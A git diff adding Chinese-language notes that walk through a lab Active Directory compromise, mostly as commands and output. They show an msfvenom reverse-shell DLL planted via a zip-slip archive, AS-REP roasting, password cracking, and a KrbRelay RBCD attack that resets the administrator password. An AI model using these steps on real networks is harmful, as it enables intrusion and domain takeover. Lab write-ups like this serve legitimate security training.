@@ -6,9 +6,123 @@
 #### 本质就是：一台机器可以代表其他用户去请求服务票据（TGS）
 #### MachineAccountQuota（默认 10）
 #### 用 KrbRelay实战 RBCD 
-### 总结
+
+<details>
+
+<summary>总结</summary>
+
 ```
+————————————————————————————————————————————————————
+//.exe 或 .dll在windows不能单一运行，需要目录完整和二进制文件传输完整！！！
+
+tp> binary
+200 Type set to I.
+ftp> !mkdir app
+ftp> lcd app
+Local directory now: /home/syareya55/app
+ftp> cd app
+250 CWD command successful.
+ftp> mget *
+mget changelog [anpqy?]? 
+[★]$ tar -czvf app.tar.gz app
+————————————————————————————————————————————————————
+//安装了dotpeek终于打开了 SampleScanner.dll 文件
+https://www.jetbrains.com/decompiler/
+————————————————————————————————————————————————————
+//使用工具“进程监视器Process Monitor”
+https://learn.microsoft.com/en-us/sysinternals/downloads/procmon 
+解压之后运行Procmon.exe：选择 ‘process Name' is 'SampleScanner.exe' then 'Include'
+
+在Process Monitor找 Result:NAME NOT FOUND | Operation:CreateFile
+
+//Windows x64 PC 无法运行 ARM64 程序，无法运行 .\SampleScanner.exe -> 会影响Process Monitor 无法搜索到Microsoft.DiaSymReader.Native.amd64.dll
+在Stack里面，
+Module			Lccation
+KemelBase.dll	LoadLibraryExW + 0x162
+//查找应用程序找不到的 DLL 文件。一个有价值的目标是应用程序根路径中搜索到的、并且已被应用程序加载的 DLL 文件（例如，通过 LoadLibraryExW 调用加载）
+————————————————————————————————————————————————————
+[★]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.27 LPORT=443 -f dll -o hostfxr.dll
+[★]$ python3 
+Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>>
+>>> import zipfile
+>>> with open('hostfxr.dll', 'rb') as f:
+...     hostfxr = f.read()
+... 
+>>> with zipfile.ZipFile('slip-shell.zip','w') as zip:
+...     zip.writestr('../app/hostfxr.dll',hostfxr)
+... 
+>>> exit()
+
+[★]$ netexec smb brunodc.bruno.vl -u svc_scan -p Sunshine1 --shares
+SMB         10.129.8.171    445    BRUNODC          queue           READ,WRITE  
+
+[★]$ smbclient //brunodc.bruno.vl/queue -U 'svc_scan%Sunshine1'
+smb: \> put  slip-shell.zip
+————————————————————————————————————————————————————
+[★]$ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+[★]$ chmod +x kerbrute
+
+[★]$ ./kerbrute userenum users.txt -d bruno.vl --dc brunodc.bruno.vl
+2026/03/16 01:36:54 >  	brunodc.bruno.vl:88
+
+[★]$ netexec ldap brunodc.bruno.vl -u svc_scan -p '' --asreproast svc_scan.asreproast 
+LDAP        10.129.8.171    445    BRUNODC          
+//svc_scan.asreproast为文件名，真正的攻击技术叫 AS-REP Roasting，把得到的 hash 保存到这个文件
+[★]$ cp /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz . --> 得到Sunshine1
+————————————————————————————————————————————————————
+PS C:\Users> whoami /all
+
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota
+[★]$ netexec ldap brunodc.bruno.vl -u "svc_scan" -p "Sunshine1" -M maq
+MAQ         10.129.8.171    389    BRUNODC          [*] Getting the MachineAccountQuota
+MAQ         10.129.8.171    389    BRUNODC          MachineAccountQuota: 10 //普通域用户最多可以创建 10 台计算机账户
+————————————————————————————————————————————————————
+[★]$ git clone https://github.com/Kevin-Robertson/Sharpmad.git //Sharpmad.csproj
+[★]$ git clone https://github.com/cube0x0/KrbRelay.git //CheckPort.exe  && KrbRelay.exe  这个需要在Pwnbox上的目标windows机器编译不了，需要在本机生成.exe再上传
+[★]$ wget https://raw.githubusercontent.com/ohpe/juicy-potato/refs/heads/master/CLSID/GetCLSID.ps1
+
+PS C:\programdata> Expand-Archive sharpmad.zip //解压
+PS C:\programdata> ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe //生成.exe的默认路径
+PS C:\programdata> .\MSBuild.exe sharpmad/sharpmad/Sharpmad.csproj
+————————————————————————————————————————————————————
+PS C:\programdata> ./Sharpmad.exe MAQ -Action new -MachineAccount roguecomputer -MachinePassword xiaohei
+./Sharpmad.exe MAQ -Action new -MachineAccount roguecomputer -MachinePassword xiaohei
+[+] Machine account roguecomputer added
+————————————————————————————————————————————————————
+PS C:\ProgramData> ./CheckPort.exe
+./CheckPort.exe
+[*] Looking for available ports..
+[*] SYSTEM Is allowed through port 10246
+————————————————————————————————————————————————————
+PS C:\ProgramData> [System.Security.Principal.SecurityIdentifier]::new((([ADSI]"LDAP://CN=roguecomputer,CN=Computers,DC=bruno,DC=vl").objectSID).Value,0).Value
+
+S-1-5-21-1536375944-4286418366-3447278137-5101
+————————————————————————————————————————————————————
+PS C:\ProgramData> ./GetCLSID.ps1
+PS C:\ProgramData> ls Windows_Server_2022_Datacenter
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         3/17/2026   6:06 AM           3200 CLSID.list                                                           
+-a----         3/17/2026   6:06 AM           7697 CLSIDs.csv
+
+PS C:\ProgramData> cat Windows_server_2022_Datacenter\\CLSIDs.csv
+
+PS C:\ProgramData> Import-Csv Windows_Server_2022_Datacenter\CLSIDs.csv | ForEach-Object { $entry = $_; try { $svc = Get-Service $entry.LocalService -ErrorAction Stop; if ($svc.Status -eq "Running") { try { [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($entry.CLSID.Trim("{}")))|Out-Null; "$($entry.LocalService) | $($entry.CLSID) | Activate OK" } catch { if ($_.Exception.Message -match "80070005") { $r = "Access Denied" } elseif ($_.Exception.Message -match "80040111") { $r = "Class Not Available" } elseif ($_.Exception.Message -match "80070422") { $r = "Service Disabled" } else { $r = "Failed" }; "$($entry.LocalService) | $($entry.CLSID) | $r" } } } catch {} }
+
+CertSvc | {D99E6E73-FC88-11D0-B498-00A0C90312F3} | Activate OK
+UsoSvc | {84C80796-F07C-4340-8897-DA954AADBF16} | Class Not Av
+vds | {7D1933CB-86F6-4A98-8628-01BE94C9A575} | Access Denied
+————————————————————————————————————————————————————
+PS C:\ProgramData> ./KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 -ssl -port 10246 -reset-password administrator Lacure77#
+————————————————————————————————————————————————————
+[★]$ evil-winrm -i brunodc.bruno.vl -u 'administrator' -p 'Lacure77#'
+————————————————————————————————————————————————————
 ```
+
+</details>
 
 <details>
 	
